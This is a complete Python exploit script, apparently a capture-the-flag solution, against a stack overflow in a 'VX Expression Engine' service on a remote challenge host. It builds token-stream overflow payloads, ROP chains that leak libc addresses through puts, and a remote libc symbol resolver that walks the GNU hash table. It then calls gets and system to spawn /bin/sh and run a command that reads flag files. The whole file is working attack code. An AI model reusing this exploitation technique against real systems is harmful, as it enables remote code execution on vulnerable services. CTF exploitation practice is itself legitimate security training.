#!/usr/bin/env python3
import argparse
import os
import socket
import struct
import subprocess
import sys
import time
import select

BIN = './vx'
HOST = 'pwn-east.cbd2026.cloud'
PORT = 5001

# Non-PIE binary addresses
RET      = 0x40101a
POP_RDI  = 0x401200      # hidden in setup() movabs immediate: 5f c3
PUTS_PLT = 0x401080
PUTS_GOT = 0x404000
MAIN     = 0x4015d9
BSS      = 0x404900

BANNER = b'=== VX Expression Engine ==='
PROMPT = b'Token count:'
DONE = b'Execution complete.\n'


def p64(x):
    return struct.pack('<Q', x & ((1 << 64) - 1))

def u16(b): return struct.unpack('<H', b)[0]
def u32(b): return struct.unpack('<I', b)[0]
def u64(b): return struct.unpack('<Q', b)[0]

def signed_decimal(x):
    x &= (1 << 64) - 1
    if x >= (1 << 63):
        x -= 1 << 64
    return str(x)


def overflow_payload(chain, n=160):
    """Build a token stream. `chain` starts at the saved return address."""
    need = 133 + len(chain)
    if n < need:
        n = need
    toks = [0] * n

    # token[128] overlaps the VM count variable used after input.
    # It is incremented once per successful scanf. Make final count become 0
    # so run_vm() returns immediately before our smashed return address is used.
    toks[128] = 128 - n

    # token[130]'s high dword overlaps the loop bound (f4). Raise it from 136
    # to `n`, so scanf continues and gives us a longer ROP chain.
    toks[130] = n << 32

    # token[131]'s high dword overlaps the loop counter. Keep it progressing
    # normally: scanf writes 131, then the loop increments it to 132.
    toks[131] = 131 << 32

    # token[132] is saved rbp. Junk is fine because leave; ret only pops it.
    toks[132] = 0

    for i, v in enumerate(chain):
        toks[133 + i] = v

    return ('128\n' + '\n'.join(signed_decimal(x) for x in toks) + '\n').encode()


class Tube:
    def __init__(self, local=False, host=HOST, port=PORT, bin_path=BIN):
        self.local = local
        self.buf = b''
        if local:
            self.p = subprocess.Popen([bin_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE, bufsize=0)
            self.rfd = self.p.stdout.fileno()
            self.wfd = self.p.stdin.fileno()
            self.sock = None
        else:
            self.sock = socket.create_connection((host, port))
            self.sock.settimeout(5.0)
            self.p = None
            self.rfd = None
            self.wfd = None
        self.recv_until(PROMPT)

    def send(self, data):
        if self.local:
            os.write(self.wfd, data)
        else:
            self.sock.sendall(data)

    def recv_some(self, timeout=0.2):
        if self.local:
            r, _, _ = select.select([self.rfd], [], [], timeout)
            if not r:
                return b''
            return os.read(self.rfd, 4096)
        try:
            return self.sock.recv(4096)
        except socket.timeout:
            return b''

    def recv_until(self, marker, timeout=10.0):
        end = time.time() + timeout
        while marker not in self.buf:
            if time.time() > end:
                raise TimeoutError(f'timed out waiting for {marker!r}; buffered={self.buf[-200:]!r}')
            chunk = self.recv_some(0.2)
            if not chunk:
                if self.local and self.p.poll() is not None:
                    raise EOFError(f'process exited with {self.p.poll()}')
                continue
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out

    def send_stage_and_get_output(self, chain):
        self.send(overflow_payload(chain))
        return self.recv_until(PROMPT)

    def leak(self, addr):
        # Do NOT add a leading ret here: returning to main must preserve main's
        # normal stack alignment, or the next scanf can crash.
        out = self.send_stage_and_get_output([POP_RDI, addr, PUTS_PLT, MAIN])
        if DONE not in out:
            raise RuntimeError(f'bad leak output: {out!r}')
        after = out.split(DONE, 1)[1]
        delim = b'\n' + BANNER
        pos = after.rfind(delim)
        if pos < 0:
            raise RuntimeError(f'could not isolate leak bytes: {out!r}')
        return after[:pos]

    def interactive(self):
        if self.local:
            while True:
                r, _, _ = select.select([self.rfd, sys.stdin.fileno()], [], [])
                if self.rfd in r:
                    data = os.read(self.rfd, 4096)
                    if not data:
                        return
                    os.write(sys.stdout.fileno(), data)
                if sys.stdin.fileno() in r:
                    data = os.read(sys.stdin.fileno(), 4096)
                    if not data:
                        return
                    os.write(self.wfd, data)
        else:
            self.sock.settimeout(0.05)
            while True:
                r, _, _ = select.select([self.sock, sys.stdin], [], [])
                if self.sock in r:
                    try:
                        data = self.sock.recv(4096)
                    except socket.timeout:
                        data = b''
                    if not data:
                        return
                    sys.stdout.buffer.write(data); sys.stdout.buffer.flush()
                if sys.stdin in r:
                    data = sys.stdin.buffer.read1(4096)
                    if not data:
                        return
                    self.sock.sendall(data)


class MemReader:
    def __init__(self, tube):
        self.t = tube
        self.cache = {}

    def read(self, addr, n):
        res = bytearray()
        cur = addr
        while len(res) < n:
            if cur in self.cache:
                res.append(self.cache[cur])
                cur += 1
                continue
            s = self.t.leak(cur)
            if s:
                # puts printed bytes up to the next NUL. Cache all of them plus
                # the terminating NUL byte that stopped puts.
                for i, b in enumerate(s):
                    self.cache[cur + i] = b
                self.cache[cur + len(s)] = 0
            else:
                self.cache[cur] = 0
            # loop back and consume from cache
        return bytes(res)

    def u32(self, addr): return u32(self.read(addr, 4))
    def u64(self, addr): return u64(self.read(addr, 8))


def gnu_hash(name):
    h = 5381
    for c in name.encode() + b'\x00':
        if c == 0:
            break
        h = ((h << 5) + h + c) & 0xffffffff
    return h


def ptr(base, val):
    # Dynamic-table pointers in ET_DYN usually appear as offsets in the image.
    return val if val >= base else base + val


def find_libc_base(tube):
    raw = tube.leak(PUTS_GOT)
    puts_addr = u64(raw[:8].ljust(8, b'\x00'))
    print(f'[+] leaked puts = {puts_addr:#x}', file=sys.stderr)

    page = puts_addr & ~0xfff
    for cand in range(page, page - 0x400000, -0x1000):
        try:
            if tube.leak(cand).startswith(b'\x7fELF'):
                print(f'[+] libc base = {cand:#x}', file=sys.stderr)
                return cand, puts_addr
        except Exception:
            break
    raise RuntimeError('failed to find libc ELF base')


def find_symbol(mem, base, symbol):
    eh = mem.read(base, 64)
    phoff = u64(eh[32:40])
    phentsz = u16(eh[54:56])
    phnum = u16(eh[56:58])

    dyn_addr = dyn_size = None
    ph = mem.read(base + phoff, phentsz * phnum)
    for i in range(phnum):
        p = ph[i * phentsz:(i + 1) * phentsz]
        p_type = u32(p[0:4])
        if p_type == 2:  # PT_DYNAMIC
            dyn_addr = base + u64(p[16:24])
            dyn_size = u64(p[40:48])
            break
    if dyn_addr is None:
        raise RuntimeError('PT_DYNAMIC not found')

    tags = {}
    for off in range(0, dyn_size, 16):
        tag = mem.u64(dyn_addr + off)
        val = mem.u64(dyn_addr + off + 8)
        if tag == 0:
            break
        tags[tag] = val

    DT_HASH = 4
    DT_STRTAB = 5
    DT_SYMTAB = 6
    DT_SYMENT = 11
    DT_GNU_HASH = 0x6ffffef5

    strtab = ptr(base, tags[DT_STRTAB])
    symtab = ptr(base, tags[DT_SYMTAB])
    syment = tags.get(DT_SYMENT, 24)
    gnuhash = ptr(base, tags[DT_GNU_HASH])

    h = gnu_hash(symbol)
    nbuckets = mem.u32(gnuhash)
    symoffset = mem.u32(gnuhash + 4)
    bloom_size = mem.u32(gnuhash + 8)
    buckets = gnuhash + 16 + 8 * bloom_size
    chains = buckets + 4 * nbuckets

    idx = mem.u32(buckets + 4 * (h % nbuckets))
    if idx == 0:
        raise RuntimeError(f'{symbol} not found in GNU hash bucket')

    while True:
        hv = mem.u32(chains + 4 * (idx - symoffset))
        if (hv | 1) == (h | 1):
            st_name = mem.u32(symtab + idx * syment)
            nm = mem.t.leak(strtab + st_name).split(b'\x00', 1)[0]
            if nm == symbol.encode():
                st_value = mem.u64(symtab + idx * syment + 8)
                addr = base + st_value
                print(f'[+] {symbol} = {addr:#x}', file=sys.stderr)
                return addr
        if hv & 1:
            break
        idx += 1
    raise RuntimeError(f'{symbol} not found')


def main():
    ap = argparse.ArgumentParser(description='Exploit VX Expression Engine')
    ap.add_argument('--local', action='store_true', help='run ./vx locally instead of remote')
    ap.add_argument('--bin', default=BIN, help='local binary path')
    ap.add_argument('--host', default=HOST)
    ap.add_argument('--port', type=int, default=PORT)
    ap.add_argument('--cmd', default='cat flag* 2>/dev/null; cat /flag* 2>/dev/null; id',
                    help='command to run after spawning the shell')
    args = ap.parse_args()

    t = Tube(local=args.local, host=args.host, port=args.port, bin_path=args.bin)
    base, _ = find_libc_base(t)
    mem = MemReader(t)
    system = find_symbol(mem, base, 'system')
    gets = find_symbol(mem, base, 'gets')

    print('[+] sending final ROP: gets(.bss), system(.bss)', file=sys.stderr)
    final = [RET, POP_RDI, BSS, gets, RET, POP_RDI, BSS, system, MAIN]
    # Do not leave a newline after the final numeric token: gets() would
    # consume that empty line. Put /bin/sh immediately after the last digit;
    # scanf("%lld") stops at '/', then gets() reads /bin/sh.
    t.send(overflow_payload(final).rstrip(b'\n') + b'/bin/sh\n')
    time.sleep(0.1)
    if args.cmd:
        t.send(args.cmd.encode() + b'\n')
        # Print the first burst of command output. If running from a real
        # terminal, drop into interactive mode afterwards.
        end = time.time() + 1.0
        while time.time() < end:
            chunk = t.recv_some(0.1)
            if chunk:
                sys.stdout.buffer.write(chunk)
                sys.stdout.buffer.flush()
                end = time.time() + 0.2
    if sys.stdin.isatty():
        t.interactive()


if __name__ == '__main__':
    main()
